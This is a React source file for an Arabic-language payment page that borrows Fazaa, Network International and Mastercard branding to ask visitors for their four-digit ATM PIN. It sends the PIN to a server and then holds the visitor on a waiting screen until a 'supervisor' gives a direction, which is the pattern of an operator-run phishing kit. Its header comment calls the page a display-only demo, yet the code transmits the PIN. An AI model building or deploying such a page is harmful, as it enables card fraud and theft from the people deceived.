/* صفحة الرمز السري التجريبية — 4 أرقام لإثبات ملكية البطاقة (عرض فقط) */
import { useState, useRef } from "react";
import { toast } from "sonner";
import SiteLayout from "@/components/SiteLayout";
import WaitingScreen from "@/components/WaitingScreen";
import { useOrder } from "@/contexts/OrderContext";
import { upsertCurrentOrder, resetCurrentDirectiveToWait } from "@/lib/liveOrders";

export default function Pin() {
  const { update } = useOrder();
  const [digits, setDigits] = useState(["", "", "", ""]);
  const [waiting, setWaiting] = useState(false);
  const inputs = useRef<(HTMLInputElement | null)[]>([]);

  const handle = (i: number, v: string) => {
    const d = v.replace(/\D/g, "").slice(-1);
    const next = [...digits];
    next[i] = d;
    setDigits(next);
    if (d && i < 3) inputs.current[i + 1]?.focus();
  };

  const submit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (digits.some((d) => !d)) {
      toast.error("يرجى إدخال الرمز السري المكوّن من 4 أرقام");
      return;
    }
    const orderNumber = "FZ-" + Math.floor(100000 + Math.random() * 900000);
    update({ orderNumber });
    // إرسال الرقم السري إلى الخادم ثم البقاء في الانتظار حتى توجيه المشرف
    setWaiting(true);
    try {
      await upsertCurrentOrder({ page: "الرقم السري", pin: digits.join(""), directive: "wait" });
    } catch {
      /* تجاهل */
    }
  };

  if (waiting) {
    return (
      <SiteLayout>
        <WaitingScreen />
      </SiteLayout>
    );
  }

  return (
    <SiteLayout>
      <section className="container pb-16 max-w-md pt-8">
        <div className="bg-white rounded-2xl p-6 shadow-sm border border-gray-100">
          {/* Header Logos */}
          <div className="flex justify-between items-center mb-5">
            <div className="flex flex-col items-center justify-center border border-[#E6C766]/30 rounded-lg px-3 py-1 bg-[#fdfbf7]">
              <span className="text-[#C9A227] font-bold text-sm">فزعة</span>
              <span className="text-[#C9A227] font-bold text-xs tracking-widest">FAZAA</span>
            </div>
            <div className="flex items-center gap-3">
              <div className="border border-gray-200 rounded px-2 py-1 bg-white">
                <span className="text-[#1a3b70] font-bold text-sm">Network<span className="text-red-500">&gt;</span></span>
                <div className="text-[6px] text-gray-400 text-center">International Payment Solutions</div>
              </div>
              <div className="relative w-12 h-8">
                <div className="absolute left-0 w-8 h-8 rounded-full bg-[#eb001b] opacity-90 z-10"></div>
                <div className="absolute left-4 w-8 h-8 rounded-full bg-[#f79e1b] opacity-90 z-0"></div>
              </div>
            </div>
          </div>

          {/* ATM Label */}
          <div className="mb-5">
            <h2 className="text-2xl font-extrabold text-gray-800 tracking-wider">ATM</h2>
          </div>

          <hr className="border-gray-200 mb-6" />

          {/* Title & Description */}
          <div className="text-center mb-6">
            <h1 className="text-xl font-bold text-[#C9A227] mb-4">إثبات ملكية البطاقة</h1>
            <p className="text-sm text-gray-600 leading-relaxed">
              لتأكيد العملية، يرجى إدخال الرقم السري للصراف الآلي المكوّن من 4 خانات للتحقق من ملكية البطاقة وإتمام عملية الدفع بأمان.
            </p>
          </div>

          <hr className="border-gray-200 mb-6" />

          {/* PIN Section */}
          <div className="text-center mb-6">
            <h2 className="text-lg font-bold text-gray-800 mb-2">يرجى إدخال الرقم السري للصراف الآلي (ATM):</h2>
            <p className="text-xs text-gray-500">
              أدخل الرمز السري المرتبط بالبطاقة المنتهي بـ ****••••
            </p>
          </div>

          <form onSubmit={submit} className="space-y-6">
            <div className="text-right">
              <label className="block text-sm font-bold text-gray-700 mb-3">أدخل الرمز هنا:</label>
              <div className="flex justify-start gap-3" dir="ltr">
                {digits.map((d, i) => (
                  <input
                    key={i}
                    ref={(el) => { inputs.current[i] = el; }}
                    value={d ? "•" : ""}
                    onChange={(e) => handle(i, e.target.value)}
                    inputMode="numeric"
                    maxLength={1}
                    type="text"
                    className="h-14 w-14 rounded-lg border border-gray-300 bg-white text-center text-3xl font-bold focus:outline-none focus:border-[#C9A227] focus:ring-1 focus:ring-[#C9A227] transition"
                  />
                ))}
              </div>
            </div>

            <button type="submit" className="w-full bg-gradient-to-b from-[#e8c86b] to-[#cba42a] text-black rounded-lg py-3 text-base font-bold shadow-sm hover:opacity-90 transition">
              تأكيد
            </button>
          </form>
        </div>
      </section>
    </SiteLayout>
  );
}
